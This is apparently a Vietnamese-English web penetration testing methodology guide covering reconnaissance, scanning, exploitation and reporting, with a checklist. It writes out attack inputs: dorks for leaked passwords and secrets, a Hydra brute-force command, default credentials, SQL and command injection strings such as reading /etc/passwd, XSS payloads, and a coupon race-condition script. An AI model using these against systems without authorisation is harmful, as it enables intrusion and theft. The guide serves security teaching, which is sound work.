# üîÑ Pentest Methodology

> Quy tr√¨nh th·ª±c hi·ªán Penetration Testing chu·∫©n

---

## Overview

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ                        PENTEST LIFECYCLE                             ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ     1.      ‚îÇ     2.      ‚îÇ     3.      ‚îÇ     4.      ‚îÇ     5.      ‚îÇ
‚îÇ Recon       ‚îÇ Scanning    ‚îÇ Exploitation‚îÇ Post-Exploit‚îÇ Reporting   ‚îÇ
‚îÇ             ‚îÇ             ‚îÇ             ‚îÇ             ‚îÇ             ‚îÇ
‚îÇ Thu th·∫≠p    ‚îÇ T√¨m ƒëi·ªÉm    ‚îÇ Khai th√°c   ‚îÇ ƒê√°nh gi√°    ‚îÇ B√°o c√°o     ‚îÇ
‚îÇ th√¥ng tin   ‚îÇ y·∫øu         ‚îÇ l·ªó h·ªïng     ‚îÇ impact      ‚îÇ k·∫øt qu·∫£     ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

---

## Phase 1: Reconnaissance (Thu th·∫≠p th√¥ng tin)

### 1.1 Passive Reconnaissance

> Thu th·∫≠p th√¥ng tin m√† kh√¥ng t∆∞∆°ng t√°c tr·ª±c ti·∫øp v·ªõi target

**Techniques:**

| Technique                | Tool/Method   | Th√¥ng tin thu ƒë∆∞·ª£c          |
| ------------------------ | ------------- | ------------------------------- |
| WHOIS Lookup             | whois, who.is | Domain owner, registration date |
| DNS Records              | dig, nslookup | Subdomains, mail servers        |
| Google Dorking           | Google search | Sensitive files, exposed pages  |
| GitHub Search            | github.com    | Source code, secrets            |
| Shodan                   | shodan.io     | Open ports, services            |
| Certificate Transparency | crt.sh        | Subdomains from SSL certs       |

**Google Dorks Examples:**

```
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com "password" filetype:log
site:target.com ext:sql | ext:db | ext:backup
"target.com" password OR secret OR credentials
```

**GitHub Dorks:**

```
org:targetcompany password
org:targetcompany api_key
org:targetcompany secret
"target.com" filename:.env
```

### 1.2 Active Reconnaissance

> T∆∞∆°ng t√°c tr·ª±c ti·∫øp v·ªõi target

**Subdomain Enumeration:**

```bash
# S·ª≠ d·ª•ng subfinder
subfinder -d target.com -o subdomains.txt

# S·ª≠ d·ª•ng amass
amass enum -d target.com

# Brute-force v·ªõi wordlist
gobuster dns -d target.com -w wordlist.txt
```

**Technology Fingerprinting:**

```bash
# Wappalyzer (browser extension)
# whatweb CLI tool
whatweb https://target.com

# Check HTTP headers
curl -I https://target.com
```

---

## Phase 2: Scanning & Enumeration

### 2.1 Port Scanning

```bash
# Quick scan common ports
nmap -sV target.com

# Full port scan
nmap -p- -sV -sC target.com

# Scan specific ports
nmap -p 80,443,8080,3000 target.com
```

**Common Web Ports:**

```
80    - HTTP
443   - HTTPS
8080  - HTTP Alternate
8443  - HTTPS Alternate
3000  - Node.js dev
5000  - Python Flask dev
```

### 2.2 Directory/File Enumeration

```bash
# Gobuster
gobuster dir -u https://target.com -w /path/to/wordlist.txt

# ffuf (faster)
ffuf -u https://target.com/FUZZ -w wordlist.txt

# Common finds
/admin
/api
/backup
/.git
/.env
/robots.txt
/sitemap.xml
```

### 2.3 API Enumeration

**Identify API Endpoints:**

```bash
# From JavaScript files
curl https://target.com/main.js | grep -oE '/api/[a-zA-Z0-9_/]+'

# Fuzzing API versions
ffuf -u https://target.com/api/FUZZ/users -w versions.txt
# versions.txt: v1, v2, v3, etc.
```

**Common API Paths:**

```
/api/v1/users
/api/v1/auth/login
/api/v1/admin
/api/docs
/swagger.json
/openapi.json
```

### 2.4 Vulnerability Scanning

```bash
# Nikto - Web server scanner
nikto -h https://target.com

# OWASP ZAP - Automated scanner
# Use GUI or CLI

# Nuclei - Template-based scanner
nuclei -u https://target.com -t cves/
```

---

## Phase 3: Exploitation

### 3.1 Authentication Testing

**Brute Force:**

```bash
# Hydra
hydra -l admin -P passwords.txt target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid"

# Burp Suite Intruder (recommended)
```

**Common Weak Credentials:**

```
admin:admin
admin:password
admin:123456
test:test
user:user
```

**JWT Testing:**

```bash
# Check for none algorithm
# Original: eyJhbGciOiJIUzI1NiIs...
# Modified header: {"alg":"none"}

# Check for weak secret
# Tools: jwt_tool, hashcat
```

### 3.2 Injection Testing

**SQL Injection:**

```
# Basic tests
'
"
' OR '1'='1
' OR '1'='1' --
' UNION SELECT NULL --

# Time-based blind
' AND SLEEP(5) --
' AND pg_sleep(5) --
```

**Command Injection:**

```
; ls
| cat /etc/passwd
`whoami`
$(whoami)
```

**XSS Payloads:**

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)
"><script>alert(1)</script>
```

### 3.3 Access Control Testing

**IDOR Testing:**

```http
# Original request
GET /api/users/123/orders

# Test with other IDs
GET /api/users/124/orders
GET /api/users/1/orders
GET /api/users/999999/orders
```

**Privilege Escalation:**

```http
# As normal user, try admin endpoints
GET /api/admin/users
POST /api/admin/settings

# Modify role in request
POST /api/users
{"username": "test", "role": "admin"}
```

### 3.4 Business Logic Testing

**Price Manipulation:**

```http
# Original
POST /api/orders
{"item": "product1", "price": 100, "quantity": 1}

# Tampered
POST /api/orders
{"item": "product1", "price": 1, "quantity": 1}
{"item": "product1", "price": -100, "quantity": 1}
```

**Race Conditions:**

```python
# G·ª≠i nhi·ªÅu request c√πng l√∫c
import threading
import requests

def redeem_coupon():
    requests.post('/api/coupons/redeem', data={'code': 'DISCOUNT50'})

threads = [threading.Thread(target=redeem_coupon) for _ in range(10)]
for t in threads: t.start()
for t in threads: t.join()
```

---

## Phase 4: Post-Exploitation

### 4.1 Impact Assessment

**Questions to answer:**

- Data n√†o c√≥ th·ªÉ access ƒë∆∞·ª£c?
- C√≥ th·ªÉ modify/delete data kh√¥ng?
- C√≥ th·ªÉ escalate privileges kh√¥ng?
- C√≥ th·ªÉ pivot sang h·ªá th·ªëng kh√°c kh√¥ng?

### 4.2 Evidence Collection

**Capture screenshots:**

- Vulnerable endpoints
- Successful exploits
- Sensitive data accessed

**Save request/response:**

```
# Burp Suite: Right-click ‚Üí Save item
# Save as text file v·ªõi ƒë·∫ßy ƒë·ªß headers
```

### 4.3 Persistence (Ethical Hacking Only!)

> ‚ö†Ô∏è CH·ªà th·ª±c hi·ªán tr√™n systems b·∫°n ƒë∆∞·ª£c ph√©p test!

- Document how attacker could maintain access
- Identify cleanup procedures

---

## Phase 5: Reporting

### 5.1 Report Structure

```markdown
# Security Assessment Report

## Executive Summary
- T√≥m t·∫Øt cho non-technical stakeholders
- High-level findings v√† recommendations

## Scope
- Systems tested
- Testing timeframe
- Methodology used

## Findings

### [CRITICAL] SQL Injection in Login Form
- **Severity**: Critical
- **CVSS Score**: 9.8
- **Location**: POST /api/auth/login
- **Description**: ...
- **Impact**: ...
- **Proof of Concept**: ...
- **Remediation**: ...

### [HIGH] Broken Access Control
...

## Recommendations
- Prioritized list of fixes

## Appendix
- Raw data, screenshots, tool outputs
```

### 5.2 Severity Ratings

| Severity           | CVSS     | Examples                                |
| ------------------ | -------- | --------------------------------------- |
| **Critical** | 9.0-10.0 | RCE, SQLi with full access, Auth bypass |
| **High**     | 7.0-8.9  | Stored XSS, IDOR to sensitive data      |
| **Medium**   | 4.0-6.9  | Reflected XSS, Information disclosure   |
| **Low**      | 0.1-3.9  | Missing headers, Verbose errors         |
| **Info**     | 0.0      | Observations, best practices            |

---

## Web Application Pentest Checklist

### Information Gathering

- [ ] Identify technologies (framework, language, server)
- [ ] Enumerate subdomains
- [ ] Discover hidden endpoints
- [ ] Review robots.txt, sitemap.xml
- [ ] Check for exposed API documentation

### Authentication

- [ ] Test default credentials
- [ ] Test password policy
- [ ] Test brute force protection
- [ ] Test account lockout
- [ ] Test password reset flow
- [ ] Test remember me functionality
- [ ] Test logout functionality

### Session Management

- [ ] Check session token entropy
- [ ] Test session fixation
- [ ] Test session timeout
- [ ] Test concurrent sessions
- [ ] Check cookie attributes (HttpOnly, Secure, SameSite)

### Authorization

- [ ] Test IDOR vulnerabilities
- [ ] Test privilege escalation (horizontal/vertical)
- [ ] Test forced browsing
- [ ] Test parameter tampering

### Input Validation

- [ ] Test SQL Injection
- [ ] Test XSS (Reflected, Stored, DOM)
- [ ] Test Command Injection
- [ ] Test Path Traversal
- [ ] Test File Upload vulnerabilities

### API Security

- [ ] Test rate limiting
- [ ] Test for mass assignment
- [ ] Test for excessive data exposure
- [ ] Test API versioning security
- [ ] Test CORS configuration

### Business Logic

- [ ] Test for logic flaws
- [ ] Test race conditions
- [ ] Test price/quantity manipulation
- [ ] Test workflow bypass

### Configuration

- [ ] Check security headers
- [ ] Check HTTPS/TLS configuration
- [ ] Check error handling
- [ ] Check for information leakage

---

## üìñ References

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PTES - Penetration Testing Execution Standard](http://www.pentest-standard.org/)
- [NIST SP 800-115](https://csrc.nist.gov/publications/detail/sp/800-115/final)
